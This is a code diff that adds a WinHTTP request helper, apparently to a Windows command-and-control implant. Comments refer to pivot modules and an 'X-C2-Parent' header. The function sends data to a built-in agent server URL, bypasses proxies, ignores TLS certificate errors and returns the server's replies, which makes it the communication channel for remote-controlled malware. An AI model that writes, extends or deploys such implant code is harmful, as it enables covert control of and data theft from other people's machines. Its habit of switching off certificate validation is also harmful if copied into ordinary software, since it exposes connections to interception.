@@ -142,6 +142,68 @@ cleanup:
     return ok;
 }
 
+// Public helper used by pivot modules. Injects an extra header (e.g. "X-C2-Parent: id\r\n").
+int agent_http_do(const char *method, const char *path,
+                  const uint8_t *body, size_t body_len,
+                  const char *extra_hdr,
+                  uint8_t **resp_out, size_t *resp_len, int *status) {
+    *resp_out = NULL; *resp_len = 0; *status = 0;
+    ParsedURL p = parse_url(AGENT_SERVER_URL);
+    char full_path[1024];
+    snprintf(full_path, sizeof(full_path), "%s%s", p.base, path);
+    wchar_t *w_ua   = to_wide(AGENT_USER_AGENT);
+    wchar_t *w_host = to_wide(p.host);
+    wchar_t *w_verb = to_wide(method);
+    wchar_t *w_path = to_wide(full_path);
+    int ok = 0;
+    HINTERNET hSess = WinHttpOpen(w_ua, WINHTTP_ACCESS_TYPE_NO_PROXY,
+        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+    if (!hSess) goto pub_cleanup;
+    HINTERNET hConn = WinHttpConnect(hSess, w_host, p.port, 0);
+    if (!hConn) { WinHttpCloseHandle(hSess); goto pub_cleanup; }
+    DWORD flags = p.is_https ? WINHTTP_FLAG_SECURE : 0;
+    HINTERNET hReq = WinHttpOpenRequest(hConn, w_verb, w_path,
+        NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
+    if (!hReq) { WinHttpCloseHandle(hConn); WinHttpCloseHandle(hSess); goto pub_cleanup; }
+    if (p.is_https) {
+        DWORD sec = SEC_IGNORE_FLAGS;
+        WinHttpSetOption(hReq, WINHTTP_OPTION_SECURITY_FLAGS, &sec, sizeof(sec));
+    }
+    if (extra_hdr && extra_hdr[0]) {
+        wchar_t *w_hdr = to_wide(extra_hdr);
+        WinHttpAddRequestHeaders(hReq, w_hdr, (DWORD)wcslen(w_hdr), WINHTTP_ADDREQ_FLAG_ADD);
+        free(w_hdr);
+    }
+    if (!WinHttpSendRequest(hReq, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
+            (LPVOID)body, (DWORD)body_len, (DWORD)body_len, 0))
+        { WinHttpCloseHandle(hReq); WinHttpCloseHandle(hConn); WinHttpCloseHandle(hSess); goto pub_cleanup; }
+    if (!WinHttpReceiveResponse(hReq, NULL))
+        { WinHttpCloseHandle(hReq); WinHttpCloseHandle(hConn); WinHttpCloseHandle(hSess); goto pub_cleanup; }
+    DWORD code = 0, code_sz = sizeof(code);
+    WinHttpQueryHeaders(hReq, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
+        WINHTTP_HEADER_NAME_BY_INDEX, &code, &code_sz, WINHTTP_NO_HEADER_INDEX);
+    *status = (int)code;
+    size_t cap = 8192, len = 0;
+    uint8_t *buf = (uint8_t*)malloc(cap);
+    if (buf) {
+        DWORD got;
+        while (WinHttpReadData(hReq, buf + len, (DWORD)(cap - len), &got) && got > 0) {
+            len += got;
+            if (len + 8192 > cap) {
+                cap *= 2;
+                uint8_t *nb = (uint8_t*)realloc(buf, cap);
+                if (!nb) { free(buf); buf = NULL; break; }
+                buf = nb;
+            }
+        }
+        if (buf) { *resp_out = buf; *resp_len = len; ok = 1; }
+    }
+    WinHttpCloseHandle(hReq); WinHttpCloseHandle(hConn); WinHttpCloseHandle(hSess);
+pub_cleanup:
+    free(w_ua); free(w_host); free(w_verb); free(w_path);
+    return ok;
+}
+
 // ── JSON helpers ──────────────────────────────────────────────────────────────
 
 // Extract a JSON string value. Returns 1 on success.
